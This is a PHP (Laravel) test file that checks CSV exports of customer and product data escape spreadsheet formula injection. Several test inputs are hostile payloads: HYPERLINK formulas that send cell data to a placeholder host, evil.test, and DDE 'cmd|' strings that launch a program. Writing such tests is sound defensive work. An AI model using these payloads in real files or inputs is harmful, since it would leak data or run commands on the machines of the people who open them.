<?php

namespace Tests\Feature;

use App\Models\Customer;
use App\Models\Product;
use App\Models\User;
use App\Support\CsvSafe;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\TestCase;

/**
 * Text typed by an anonymous visitor (a storefront checkout name, an address, a
 * product title from an import) must not run as a spreadsheet formula when staff
 * open an export.
 */
class CsvFormulaInjectionTest extends TestCase
{
    use RefreshDatabase;

    public function test_text_that_starts_like_a_formula_is_written_as_plain_text(): void
    {
        $this->assertSame("'=HYPERLINK(\"http://evil.test/?x=\"&A1)", CsvSafe::cell('=HYPERLINK("http://evil.test/?x="&A1)'));
        $this->assertSame("'@SUM(1+1)", CsvSafe::cell('@SUM(1+1)'));
        $this->assertSame("'+cmd|' /C calc'!A0", CsvSafe::cell("+cmd|' /C calc'!A0"));
        $this->assertSame("'-2+3+cmd|' /C calc'!A0", CsvSafe::cell("-2+3+cmd|' /C calc'!A0"));
        $this->assertSame("'\t=1+1", CsvSafe::cell("\t=1+1"));
        $this->assertSame("'\r=1+1", CsvSafe::cell("\r=1+1"));
    }

    public function test_ordinary_values_are_left_alone(): void
    {
        $this->assertSame('Rahim Uddin', CsvSafe::cell('Rahim Uddin'));
        $this->assertSame('', CsvSafe::cell(''));
        $this->assertNull(CsvSafe::cell(null));
        $this->assertSame(12, CsvSafe::cell(12));
        $this->assertSame(-5.5, CsvSafe::cell(-5.5));
        $this->assertSame('-500.00', CsvSafe::cell('-500.00'));
        $this->assertSame('+8801711223344', CsvSafe::cell('+8801711223344'));
        $this->assertSame('a=b', CsvSafe::cell('a=b'));
        $this->assertSame(['x', "'=1"], CsvSafe::row(['x', '=1']));
    }

    public function test_the_customer_export_neutralises_a_hostile_checkout_name(): void
    {
        $user = User::factory()->create(['role' => 'sales_staff', 'is_active' => true]);

        Customer::query()->create([
            'name' => '=HYPERLINK("http://evil.test/?d="&B2,"Click")',
            'phone' => '+8801712345678',
            'address' => '@SUM(1)',
            'customer_type' => 'retail',
            'customer_source' => 'website',
        ]);

        $content = $this->actingAs($user)->get(route('customers.export.csv'))->streamedContent();

        $this->assertStringContainsString('"\'=HYPERLINK(', $content);
        $this->assertStringNotContainsString(',=HYPERLINK(', $content);
        $this->assertStringNotContainsString('"=HYPERLINK(', $content);
        $this->assertStringContainsString("'@SUM(1)", $content);
        // The phone number is still a plain number-like value.
        $this->assertStringContainsString('+8801712345678', $content);
        $this->assertStringNotContainsString("'+8801712345678", $content);
    }

    public function test_the_product_export_neutralises_a_formula_in_a_product_name(): void
    {
        $user = User::factory()->create(['role' => 'super_admin', 'is_active' => true]);

        Product::query()->create([
            'name' => '=cmd|\' /C calc\'!A0',
            'sku' => 'EVIL-1',
            'price' => 100,
            'sale_price' => 90,
            'cost_price' => 50,
            'stock' => 1,
            'unit' => 'pcs',
            'is_active' => true,
            'status' => Product::STATUS_AVAILABLE,
        ]);

        $content = $this->actingAs($user)->get(route('products.export.csv'))->streamedContent();

        $this->assertStringContainsString("'=cmd|", $content);
        $this->assertStringNotContainsString(',=cmd|', $content);
        $this->assertStringNotContainsString('"=cmd|', $content);
    }
}
